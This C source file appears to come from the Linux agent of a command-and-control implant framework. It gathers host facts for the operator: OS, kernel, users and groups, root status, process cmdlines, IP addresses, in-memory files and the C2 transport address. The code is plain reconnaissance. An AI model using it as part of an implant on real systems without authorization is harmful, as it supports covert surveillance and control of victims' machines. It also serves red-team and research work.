/*
 * sysinfo.c — gather Emp3r0rAgent host facts, mirroring the Go agent's
 * agentutils.GatherSystemDetails so both agents report an identical-looking
 * target to the operator.
 *
 * Everything is best-effort and Linux-only (this file is part of the hosted
 * agent, which targets Linux). The gathered strings borrow one caller-provided
 * c2_sysinfo_store; nothing is heap-allocated.
 */

#define _GNU_SOURCE

#include "sysinfo.h"

#include <arpa/inet.h>
#include <grp.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <pwd.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

/* runtime.GOARCH of the agent binary (not the kernel arch), matching the Go
 * agent's runtime.GOARCH. */
#if defined(__x86_64__)
#define C2_AGENT_GOARCH "amd64"
#elif defined(__i386__)
#define C2_AGENT_GOARCH "386"
#elif defined(__aarch64__)
#define C2_AGENT_GOARCH "arm64"
#elif defined(__arm__)
#define C2_AGENT_GOARCH "arm"
#elif defined(__riscv) && (__riscv_xlen == 64)
#define C2_AGENT_GOARCH "riscv64"
#else
#define C2_AGENT_GOARCH "unknown"
#endif

/* ------------------------------------------------------------------------- */
/* Bump allocator for the borrowed strings/lists                              */
/* ------------------------------------------------------------------------- */

static c2_str store_put(c2_sysinfo_store *st, const char *s, size_t n) {
  if (st->buf_len >= sizeof(st->buf))
    return c2_str_of("", 0);
  size_t room = sizeof(st->buf) - st->buf_len;
  if (n > room)
    n = room;
  char *p = st->buf + st->buf_len;
  if (n)
    memcpy(p, s, n);
  st->buf_len += n;
  return c2_str_of(p, n);
}

static c2_str store_cstr(c2_sysinfo_store *st, const char *s) {
  return store_put(st, s, s ? strlen(s) : 0);
}

static c2_str store_fmt(c2_sysinfo_store *st, const char *fmt, ...) {
  char tmp[512];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
  va_end(ap);
  if (n < 0)
    return store_cstr(st, "");
  size_t len = (size_t)n;
  if (len >= sizeof(tmp))
    len = sizeof(tmp) - 1;
  return store_put(st, tmp, len);
}

/* Append one item to the shared list pool and return a list over the items
 * added since `start`. */
static void list_push(c2_sysinfo_store *st, const char *s) {
  if (st->items_len >= C2_SYSINFO_ITEMS_MAX)
    return;
  st->items[st->items_len++] = store_cstr(st, s);
}

static c2_str_list list_since(c2_sysinfo_store *st, size_t start) {
  c2_str_list l;
  l.items = &st->items[start];
  l.count = st->items_len - start;
  l.cap = l.count;
  return l;
}

/* ------------------------------------------------------------------------- */
/* /proc and /etc helpers                                                     */
/* ------------------------------------------------------------------------- */

static void read_first_line(const char *path, char *out, size_t cap) {
  out[0] = '\0';
  FILE *f = fopen(path, "r");
  if (f == NULL)
    return;
  if (fgets(out, (int)cap, f) != NULL) {
    size_t n = strlen(out);
    while (n && (out[n - 1] == '\n' || out[n - 1] == '\r'))
      out[--n] = '\0';
  }
  fclose(f);
}

/* Parse /etc/os-release into PRETTY_NAME, ID and VERSION_ID. */
static void read_os_release(char *pretty, size_t pretty_cap, char *id,
                            size_t id_cap, char *version, size_t ver_cap) {
  pretty[0] = id[0] = version[0] = '\0';
  FILE *f = fopen("/etc/os-release", "r");
  if (f == NULL)
    return;
  char line[512];
  while (fgets(line, sizeof(line), f) != NULL) {
    char *eq = strchr(line, '=');
    if (eq == NULL)
      continue;
    *eq = '\0';
    char *val = eq + 1;
    size_t vl = strlen(val);
    while (vl && (val[vl - 1] == '\n' || val[vl - 1] == '\r'))
      val[--vl] = '\0';
    if (val[0] == '"') {
      val++;
      vl = strlen(val);
      if (vl && val[vl - 1] == '"')
        val[vl - 1] = '\0';
    }
    if (strcmp(line, "PRETTY_NAME") == 0)
      snprintf(pretty, pretty_cap, "%s", val);
    else if (strcmp(line, "ID") == 0)
      snprintf(id, id_cap, "%s", val);
    else if (strcmp(line, "VERSION_ID") == 0)
      snprintf(version, ver_cap, "%s", val);
  }
  fclose(f);
}

/* osinfo_linux.GetOSInfo detects the userspace architecture from the dynamic
 * loader, not the kernel (a 32-bit agent on a 64-bit kernel reports i386).
 * Both glibc (ld-linux) and musl (ld-musl) loaders are recognised. */
static const char *detect_os_arch(void) {
  if (access("/lib64/ld-linux-x86-64.so.2", F_OK) == 0 ||
      access("/lib/ld-musl-x86_64.so.1", F_OK) == 0)
    return "amd64";
  if (access("/lib/ld-linux.so.2", F_OK) == 0 ||
      access("/lib/ld-musl-i386.so.1", F_OK) == 0)
    return "i386";
  return "";
}

static void kernel_version(char *out, size_t cap) {
  char release[128] = "unknown_release";
  char version[256] = "unknown_version";
  read_first_line("/proc/sys/kernel/osrelease", release, sizeof(release));
  read_first_line("/proc/sys/kernel/version", version, sizeof(version));
  snprintf(out, cap, "%s Linux %s", release, version);
}

static void format_uptime(char *out, size_t cap) {
  double up = 0;
  FILE *f = fopen("/proc/uptime", "r");
  if (f != NULL) {
    if (fscanf(f, "%lf", &up) != 1)
      up = 0;
    fclose(f);
  }
  long long s = (long long)up;
  snprintf(out, cap, "%lldd %lldh %lldm %llds", s / 86400, (s % 86400) / 3600,
           (s % 3600) / 60, s % 60);
}

static void proc_cmdline(pid_t pid, char *out, size_t cap) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%ld/cmdline", (long)pid);
  FILE *f = fopen(path, "rb");
  if (f == NULL) {
    snprintf(out, cap, "dead_process");
    return;
  }
  size_t n = fread(out, 1, cap - 1, f);
  fclose(f);
  for (size_t i = 0; i < n; i++) {
    if (out[i] == '\0')
      out[i] = ' ';
  }
  out[n] = '\0';
  while (n && out[n - 1] == ' ')
    out[--n] = '\0';
  if (n == 0)
    snprintf(out, cap, "unknown_cmdline");
}

static int mask_prefix_len(const struct sockaddr *sa) {
  if (sa == NULL)
    return 0;
  int bits = 0;
  if (sa->sa_family == AF_INET) {
    uint32_t m = ntohl(((const struct sockaddr_in *)sa)->sin_addr.s_addr);
    while (m) {
      bits += (int)(m & 1u);
      m >>= 1;
    }
  } else if (sa->sa_family == AF_INET6) {
    const uint8_t *b = ((const struct sockaddr_in6 *)sa)->sin6_addr.s6_addr;
    for (int i = 0; i < 16; i++) {
      uint8_t v = b[i];
      while (v) {
        bits += (v & 1u);
        v >>= 1;
      }
    }
  }
  return bits;
}

static void gather_ips(c2_sysinfo_store *st) {
  struct ifaddrs *ifaddr = NULL;
  if (getifaddrs(&ifaddr) != 0)
    return;
  for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
    if (ifa->ifa_addr == NULL)
      continue;
    int fam = ifa->ifa_addr->sa_family;
    if (fam != AF_INET && fam != AF_INET6)
      continue;
    void *src =
        (fam == AF_INET)
            ? (void *)&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr
            : (void *)&((struct sockaddr_in6 *)ifa->ifa_addr)->sin6_addr;
    char ip[INET6_ADDRSTRLEN] = {0};
    if (inet_ntop(fam, src, ip, sizeof(ip)) == NULL)
      continue;
    char entry[INET6_ADDRSTRLEN + 8];
    snprintf(entry, sizeof(entry), "%s/%d", ip,
             mask_prefix_len(ifa->ifa_netmask));
    list_push(st, entry);
  }
  freeifaddrs(ifaddr);
}

static const char *transport_label(const c2_agent_config *cfg) {
  if (cfg->c2_channel_mode.ptr == NULL)
    return "HTTP";
  c2_str mode = cfg->c2_channel_mode;
  if (mode.len == strlen("http_poll") &&
      memcmp(mode.ptr, "http_poll", mode.len) == 0)
    return "HTTP";
  if (mode.len == strlen("quic") && memcmp(mode.ptr, "quic", mode.len) == 0)
    return "QUIC";
  return "HTTP2";
}

/* Copy a possibly-unterminated c2_str into a NUL-terminated buffer. */
static void str_to_c(c2_str s, char *out, size_t cap) {
  if (out == NULL || cap == 0)
    return;
  size_t n = (s.ptr != NULL) ? s.len : 0;
  if (n >= cap)
    n = cap - 1;
  if (n)
    memcpy(out, s.ptr, n);
  out[n] = '\0';
}

/* Group ids as a comma-joined list, primary GID first. getgroups() returns
 * only the supplementary groups and drops the primary one, so a minimal
 * container (root with no supplementary groups) would report an empty list;
 * getgrouplist() matches Go's (*user.User).GroupIds and the reference agent's
 * strings.Join(gids, ","). Falls back to supplementary groups plus the
 * primary GID when the NSS lookup fails. */
static c2_str groups_joined(c2_sysinfo_store *st, const char *username) {
  enum { MAX_GROUPS = 256 };
  gid_t gids[MAX_GROUPS];
  int ng = MAX_GROUPS;
  if (getgrouplist(username, getgid(), gids, &ng) < 0) {
    int sup = getgroups(MAX_GROUPS - 1, gids + 1);
    if (sup < 0)
      sup = 0;
    gids[0] = getgid();
    int n = 1;
    for (int i = 0; i < sup; i++) {
      if (gids[i + 1] == gids[0])
        continue;
      gids[n++] = gids[i + 1];
    }
    ng = n;
  }
  if (ng > MAX_GROUPS)
    ng = MAX_GROUPS;

  char joined[4096];
  size_t off = 0;
  joined[0] = '\0';
  for (int i = 0; i < ng && off < sizeof(joined) - 1; i++) {
    int n = snprintf(joined + off, sizeof(joined) - off, "%s%u", i ? "," : "",
                     (unsigned)gids[i]);
    if (n <= 0)
      break;
    off += (size_t)n;
  }
  return store_cstr(st, joined);
}

/* ------------------------------------------------------------------------- */
/* Gather                                                                     */
/* ------------------------------------------------------------------------- */

c2_status c2_gather_agent_info(c2_agent_info *info, const c2_agent_config *cfg,
                               const c2_memfile *mem, const char *version,
                               c2_sysinfo_store *st) {
  if (info == NULL || cfg == NULL || st == NULL)
    return C2_ERR_ARG;
  memset(info, 0, sizeof(*info));
  memset(st, 0, sizeof(*st));

  char cc[256];
  str_to_c(cfg->cc_address, cc, sizeof(cc));

  /* OS name/arch/kernel, mirroring sysinfo.GetOSInfo. */
  char pretty[128] = {0}, os_id[64] = {0}, os_ver[64] = {0};
  read_os_release(pretty, sizeof(pretty), os_id, sizeof(os_id), os_ver,
                  sizeof(os_ver));
  const char *vendor = "Linux";
  if (strcmp(os_id, "debian") == 0)
    vendor = "Debian";
  else if (strcmp(os_id, "ubuntu") == 0)
    vendor = "Canonical";
  else if (strcmp(os_id, "centos") == 0 || strcmp(os_id, "rhel") == 0 ||
           strcmp(os_id, "fedora") == 0)
    vendor = "Red Hat";
  else if (strcmp(os_id, "arch") == 0)
    vendor = "Arch";
  else if (strcmp(os_id, "kali") == 0)
    vendor = "Offensive Security";
  const char *os_arch = detect_os_arch();
  if (pretty[0] == '\0')
    snprintf(pretty, sizeof(pretty), "%s", "Linux");
  info->os = store_fmt(st, "%s %s %s (%s)", vendor, pretty, os_ver, os_arch);
  info->arch = store_cstr(st, os_arch);

  char kernel[512];
  kernel_version(kernel, sizeof(kernel));
  info->kernel = store_cstr(st, kernel);

  info->goos = c2_str_lit("linux");
  info->goarch = c2_str_lit(C2_AGENT_GOARCH);
  info->version = store_cstr(st, version != NULL ? version : "N/A");

  /* Host identity. */
  char host[128] = "no_name";
  if (gethostname(host, sizeof(host) - 1) != 0)
    snprintf(host, sizeof(host), "%s", "no_name");
  host[sizeof(host) - 1] = '\0';

  struct passwd *pw = getpwuid(getuid());
  const char *username =
      (pw != NULL && pw->pw_name != NULL) ? pw->pw_name : "unknown";
  const char *home = (pw != NULL && pw->pw_dir != NULL) ? pw->pw_dir : "";

  info->hostname = store_cstr(st, host);
  info->name = store_fmt(st, "%s/%s", host, username);

  char cwd[512];
  if (getcwd(cwd, sizeof(cwd)) != NULL)
    info->cwd = store_cstr(st, cwd);

  /* Minimal hardware fields, exactly like the Go agent. */
  info->hardware = c2_str_lit("N/A");
  info->container = c2_str_lit("N/A");
  info->cpu = c2_str_lit("N/A");
  info->gpu = c2_str_lit("N/A");
  info->mem = c2_str_lit("N/A");

  info->transport = store_fmt(st, "%s (%s)", transport_label(cfg), cc);

  info->user = store_fmt(st, "%s (%s), uid=%u, gid=%u", username, home,
                         (unsigned)getuid(), (unsigned)getgid());

  /* Group ids, primary first (Go: strings.Join(u.GroupIds(), ",")). */
  info->groups = groups_joined(st, username);

  info->has_root = 1;
  info->root = (geteuid() == 0);

  /* Process info. */
  info->process.has_pid = 1;
  info->process.pid = (int64_t)getpid();
  info->process.has_ppid = 1;
  info->process.ppid = (int64_t)getppid();
  {
    char cl[512], pl[512];
    proc_cmdline(getpid(), cl, sizeof(cl));
    proc_cmdline(getppid(), pl, sizeof(pl));
    info->process.cmdline = store_cstr(st, cl);
    info->process.parent = store_cstr(st, pl);
  }

  char uptime[64];
  format_uptime(uptime, sizeof(uptime));
  info->uptime = store_cstr(st, uptime);

  /* IPs (with prefix length, like netutil.IPa). */
  {
    size_t start = st->items_len;
    gather_ips(st);
    info->ips = list_since(st, start);
  }

  /* Files available in memfs (util.ListMemFiles). */
  {
    size_t start = st->items_len;
    if (mem != NULL) {
      for (size_t i = 0; i < c2_memfile_count(mem); i++) {
        const char *k = c2_memfile_key_at(mem, i);
        if (k != NULL)
          list_push(st, k);
      }
    }
    info->files = list_since(st, start);
  }

  /* Standalone agents always talk to C2 directly (no mesh). */
  info->mesh_route = c2_str_lit("direct");

  return C2_OK;
}
